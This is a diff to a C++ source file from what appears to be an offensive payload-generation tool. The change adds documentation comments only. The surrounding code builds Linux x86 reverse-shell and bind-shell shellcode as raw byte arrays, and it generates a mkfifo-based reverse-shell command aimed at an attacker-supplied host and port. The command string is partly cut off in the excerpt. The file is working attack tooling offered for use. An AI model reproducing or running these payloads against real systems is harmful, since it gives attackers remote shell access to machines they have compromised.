@@ -2,7 +2,10 @@
 #include <sstream>
 #include "payload.hpp"
 
-// lhost -> Attacker IP, lport -> Attacker port
+/// @brief Generates Linux x86 reverse shell payload
+/// @param lhost is the attacker's IP address
+/// @param lport is the attacker's port number
+/// @return Raw Linux x86 reverse shell payload
 std::vector<uint8_t> LinuxX86ReverseShell::generatePayload(const std::string& lhost, int lport) {
     std::vector<uint8_t> payload = {
         0x31, 0xc0, 0x50, 0x40, 0x89, 0xc3, 0x50, 0x40,
@@ -31,6 +34,10 @@ std::vector<uint8_t> LinuxX86ReverseShell::generatePayload(const std::string& lh
     return payload;
 }
 
+/// @brief Generates Linux x86 reverse shell command
+/// @param lhost is the attacker's IP address
+/// @param lport is the attacker's port number
+/// @return Linux x86 reverse shell command as a string
 std::string LinuxX86ReverseShell::generateCommand(const std::string& lhost, int lport) {
     std::ostringstream cmd;
     cmd << "rm -f /tmp/f; mkfifo /tmp/f; "
@@ -38,7 +45,9 @@ std::string LinuxX86ReverseShell::generateCommand(const std::string& lhost, int 
     return cmd.str();
 }
 
-// lport -> Target port
+/// @brief Generates Linux x86 bind shell payload
+/// @param lport is the target port number
+/// @return Raw Linux x86 bind shell payload
 std::vector<uint8_t> LinuxX86BindShell::generatePayload(int lport) {
     std::vector<uint8_t> payload = {
         0x31, 0xdb, 0xf7, 0xe3, 0x53, 0x43, 0x53, 0x6a,
@@ -61,6 +70,9 @@ std::vector<uint8_t> LinuxX86BindShell::generatePayload(int lport) {
     return payload;
 }
 
+/// @brief Generates Linux x86 bind shell command
+/// @param lport is the target port number
+/// @return Linux x86 bind shell command as a string
 std::string LinuxX86BindShell::generateCommand(int lport) {
     std::ostringstream cmd;
     cmd << "rm -f /tmp/f; mkfifo /tmp/f; "
